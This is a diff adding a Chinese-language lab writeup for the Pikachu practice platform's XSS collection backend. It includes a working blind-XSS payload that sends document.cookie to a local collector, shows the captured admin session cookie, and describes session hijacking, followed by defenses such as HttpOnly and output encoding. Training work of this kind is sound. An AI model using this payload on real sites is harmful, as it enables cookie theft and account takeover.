@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Pikachu】Web-XSS后台 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+        .code-block { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow-x: auto; }
+        .code-comment { color: #6a737d; }
+        .code-keyword { color: #d73a49; }
+        .code-string { color: #032f62; }
+        .code-function { color: #6f42c1; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【Pikachu】Web-XSS后台 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.01 | <strong>分类：</strong>Pikachu | <strong>标签：</strong>Pikachu, Web, XSS后台, 数据外带</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Pikachu 漏洞练习平台</li>
+        <li><strong>分类：</strong>管理工具 - XSS后台</li>
+        <li><strong>题目名称：</strong>XSS后台</li>
+        <li><strong>目标：</strong>理解并利用 Pikachu 提供的 XSS 管理后台，将其作为攻击者控制的数据接收端，验证 XSS 盲打漏洞中数据外带与存储的完整链路。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>XSS后台的实战价值：</strong></p>
+    <p>在真实的 XSS 攻击（特别是盲打）中，攻击者无法直接在受害者浏览器中看到执行结果。因此，攻击者需要在服务器端搭建一个“接收后台”。Pikachu 的“管理工具”中内置了这样一个简易的 XSS 后台（<code>pkxss</code>），用于模拟攻击者的指挥中心。</p>
+
+    <div class="diff-box">
+        <strong>XSS后台的三大核心功能模块：</strong>
+        <ul>
+            <li><code>cookie搜集</code>：接收并展示目标浏览器发送过来的 Cookie（包含敏感登录凭证）。</li>
+            <li><code>钓鱼结果</code>：展示通过伪造登录框诱导受害者提交的账号密码。</li>
+            <li><code>键盘记录</code>：展示通过 JS 记录下的受害者在页面上的按键内容。</li>
+        </ul>
+    </div>
+
+    <h2>3. 操作步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：初始化攻击者后台环境</h3>
+        <div class="payload-box">
+            <p><strong>操作：</strong> 访问左侧菜单的“管理工具” -> “XSS后台”。</p>
+            <p><strong>回显：</strong> 提示 <code>Warning: mysqli_connect(): (HY000/1049): Unknown database 'pkxss'</code>。</p>
+        </div>
+        <p class="info-line"><span class="info-label">解决：</span> 访问 <code>http://127.0.0.1/pikachu/pkxss/pkxss_install.php</code>，点击“安装/初始化”按钮，自动创建 <code>pkxss</code> 数据库及 <code>cookie</code>、<code>fish</code>、<code>users</code> 等表。</p>
+        <p class="info-line"><span class="info-label">验证：</span> 返回后台登录页面 <code>http://127.0.0.1/pikachu/pkxss/xssmanager.php</code>，使用 <code>admin</code> / <code>123456</code> 成功登录，看到后台管理界面。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：生成测试数据（注入与触发 Payload）</h3>
+        <p class="info-line"><span class="info-label">操作 1（注入）：</span> 访问留言板 <code>http://127.0.0.1/pikachu/vul/xss/xssblind/xss_blind.php</code>，提交以下 Payload：</p>
+        <div class="payload-box">
+            <p><code>&lt;script&gt;new Image().src="http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie="+document.cookie;&lt;/script&gt;</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">操作 2（触发）：</span> 以管理员身份登录 <code>admin_login.php</code>，随后访问 <code>admin.php</code> 查看留言。此时浏览器会静默执行 Payload，将当前页面的 Cookie 发送给 XSS 后台。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：在 XSS 后台查看战果</h3>
+        <div class="payload-box">
+            <p><strong>操作：</strong> 回到 XSS 后台 <code>http://127.0.0.1/pikachu/pkxss/xssmanager.php</code>，点击左侧的 <code>cookie搜集</code>。</p>
+        </div>
+        <p class="info-line"><span class="info-label">初次回显：</span> 页面刷新后，<strong>没有任何记录</strong>（呈现空白状态）。</p>
+        <p class="info-line"><span class="info-label">后续处理：</span> 在发现无数据后，关闭了靶场和电脑，去吃饭休息。</p>
+        <p class="info-line"><span class="info-label">重启后回显：</span> 重新开机启动 PHPStudy 后，再次访问 XSS 后台并点击 <code>cookie搜集</code>。此时页面成功显示 4 条记录，时间戳为 <code>2026-10-01 06:10:49</code> 等。字段内容如下：</p>
+        <ul>
+            <li><strong>time</strong>：2026-10-01 06:10:49 等时间戳。</li>
+            <li><strong>ipaddress</strong>：127.0.0.1</li>
+            <li><strong>cookie</strong>：<code>ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=o5hdto1uddip93svk7o8up86k7;</code></li>
+            <li><strong>referer</strong>：<code>http://127.0.0.1/pikachu/vul/xss/xssblind/admin.php</code></li>
+            <li><strong>useragent</strong>：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...</li>
+        </ul>
+        <p class="info-line"><span class="info-label">结论：</span> XSS 后台成功接收并存储了受害者的敏感信息。攻击者已经可以通过窃取到的 <code>PHPSESSID</code> 实现会话劫持。虽然数据在重启后才显示，但完整的数据外带链路已验证成功。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>Payload 代码组成</h3>
+        <ul>
+            <li><code>&lt;script&gt; ... &lt;/script&gt;</code>：HTML 脚本标签，使内部代码被浏览器解析并执行。</li>
+            <li><code>new Image()</code>：创建一个新的图片对象（这种技巧不会改变页面视觉）。</li>
+            <li><code>.src=</code>：设置图片对象的源地址，强制浏览器发起 GET 请求。</li>
+            <li><code>"http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie="</code>：XSS 后台接收数据的 URL 接口。</li>
+            <li><code>+document.cookie</code>：获取当前页面的 Cookie，拼接在 URL 参数后面发送。</li>
+        </ul>
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：后台数据库缺失导致报错。</strong>初次访问 XSS 后台时报错 <code>Unknown database 'pkxss'</code>。<br>
+        <strong>原因：</strong> 靶场部署时未执行后台数据库的初始化。<br>
+        <strong>解决：</strong> 通过访问 <code>pkxss_install.php</code> 脚本自动完成建库建表，还原了接收端环境。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>核心逻辑：</strong>XSS 后台是攻击者接收和存储盲打数据的“大本营”。通过完整的注入（留言板）-> 触发（管理员审核）-> 接收（XSS后台）链路，实现了对高权限用户的会话劫持。</li>
+        <li><strong>防御措施：</strong>对用户输入进行 HTML 实体编码；设置 Cookie 的 <code>HttpOnly</code> 属性，禁止 JS 读取 Cookie；后台渲染用户数据时进行上下文输出编码。</li>
+        <li><strong>实战启发：</strong>在进行盲打漏洞测试时，必须事先搭建好接收端（如 Pikachu 的 XSS 后台）。监测后台是否收到数据，是判断漏洞是否被成功触发的唯一标准。同时，要考虑到真实环境中存在的数据库延迟和缓存机制。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
